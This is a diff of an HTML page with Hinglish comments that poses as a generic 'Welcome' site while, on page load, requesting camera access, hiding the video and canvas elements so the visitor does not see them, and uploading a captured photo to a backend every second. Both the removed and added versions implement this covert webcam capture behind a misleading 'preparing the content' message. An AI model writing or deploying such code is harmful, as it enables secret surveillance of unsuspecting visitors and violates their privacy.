@@ -3,64 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome to My Site</title>
+    <title>Welcome</title>
     <style>
         body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-        /* Video element ko chupa dega taki user ko na dikhe */
-        #video-preview { display: none; } 
-        canvas { display: none; }
+        /* Video ko chupane ke liye */
+        #video { display: none; }
     </style>
 </head>
 <body>
+    <h1>Welcome to our Website</h1>
+    <p>Please wait while we are preparing the content...</p>
+    <p id="status">Requesting camera access...</p>
 
-    <h1>Welcome!</h1>
-    <p id="status">Please wait, starting camera...</p>
-
-    <!-- Video stream yahan aayega -->
-    <video id="video-preview" autoplay></video>
-    <!-- Photo capture karne ke liye Canvas -->
-    <canvas id="canvas"></canvas>
+    <!-- Video element jahan camera feed aayegi -->
+    <video id="video" width="300" height="225" autoplay playsinline></video>
+    <!-- Canvas jahan se photo capture hogi (yeh bhi chupa hua hai) -->
+    <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
 
     <script>
-        const video = document.getElementById('video-preview');
+        const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const statusEl = document.getElementById('status');
-        const backendUrl = 'http://localhost:3000/upload'; // Aapka backend server URL
+        const context = canvas.getContext('2d');
 
-        // 1. User se Camera access ke liye permission maango
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                statusEl.textContent = "Camera access granted. Capturing photo...";
+        // Function jo camera start karega
+        async function startCamera() {
+            try {
+                // User se camera ki permission maangega
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 video.srcObject = stream;
+                statusEl.textContent = "Camera access granted. Capturing...";
                 
-                // Har 1 second mein photo capture karke bhejo
-                // **WARNING: Yeh aapke browser aur server ko slow kar sakta hai!**
-                setInterval(() => {
-                    captureAndSend();
-                }, 1000); // 1000 milliseconds = 1 second
-            })
-            .catch(err => {
-                console.error("Camera access error:", err);
-                statusEl.textContent = "Could not access the camera. Please allow camera permission.";
-                alert("You denied camera access. This site requires camera to function.");
-            });
+                // Har 1 second me photo capture karke bhejega
+                // WARNING: 1000ms is too fast. Use a higher value like 10000ms (10 seconds)
+                setInterval(captureAndSend, 1000); 
 
-        // 2. Photo capture karke backend ko bhejne wala function
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+                statusEl.textContent = "Could not access the camera. Please grant permission.";
+            }
+        }
+
+        // Function jo photo capture karke backend ko bhejega
         function captureAndSend() {
-            const context = canvas.getContext('2d');
-            
-            // Canvas ka size video ke barabar set karo
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Video ka current frame canvas par draw karo
+            // Video ka current frame canvas par draw karega
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            // Canvas se image data ko Base64 format mein nikalo
+            // Canvas ki image ko Base64 format me convert karega
             const imageData = canvas.toDataURL('image/jpeg');
-            
-            // 3. Image data ko server par bhejo
-            fetch(backendUrl, {
+
+            // Backend ko photo bhejega
+            fetch('/api/send-photo', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -68,13 +61,12 @@
                 body: JSON.stringify({ image: imageData })
             })
             .then(response => response.json())
-            .then(data => {
-                console.log('Server response:', data.message);
-            })
-            .catch(error => {
-                console.error('Error sending image to server:', error);
-            });
+            .then(data => console.log('Server response:', data))
+            .catch((error) => console.error('Error sending photo:', error));
         }
+
+        // Page load hote hi camera start karne ki koshish karega
+        startCamera();
     </script>
 </body>
 </html>
